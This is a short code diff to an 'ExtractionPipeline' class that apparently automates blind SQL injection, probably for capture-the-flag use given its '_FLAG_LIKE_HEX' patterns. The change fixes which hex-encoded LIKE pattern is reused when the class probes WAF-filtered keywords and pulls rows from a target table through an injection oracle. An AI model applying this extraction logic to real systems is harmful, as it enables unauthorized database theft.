@@ -253,7 +253,7 @@ class ExtractionPipeline:
         if self.waf.is_filtered("like"):
             return None
         comma_ok = not self.waf.is_filtered(",")
-        hit_col, n_rows = None, 0
+        hit_col, hit_hex, n_rows = None, _FLAG_LIKE_HEX[0], 0
         for col in columns:
             if self.s.stopped:
                 return None
@@ -265,7 +265,8 @@ class ExtractionPipeline:
                 except OracleError:
                     continue
                 if cnt > 0:
-                    hit_col, n_rows = col, min(cnt, 3 if comma_ok else 1)
+                    hit_col, hit_hex = col, like_hex
+                    n_rows = min(cnt, 3 if comma_ok else 1)
                     break
             if hit_col:
                 break
@@ -284,7 +285,7 @@ class ExtractionPipeline:
                 try:
                     row[c] = self.o.scalar(
                         f"(select {c} from {db}.{table} where {hit_col} "
-                        f"like {_FLAG_LIKE_HEX[0]}{lim})")
+                        f"like {hit_hex}{lim})")
                 except OracleError:
                     row[c] = ""
             rows.append(row)
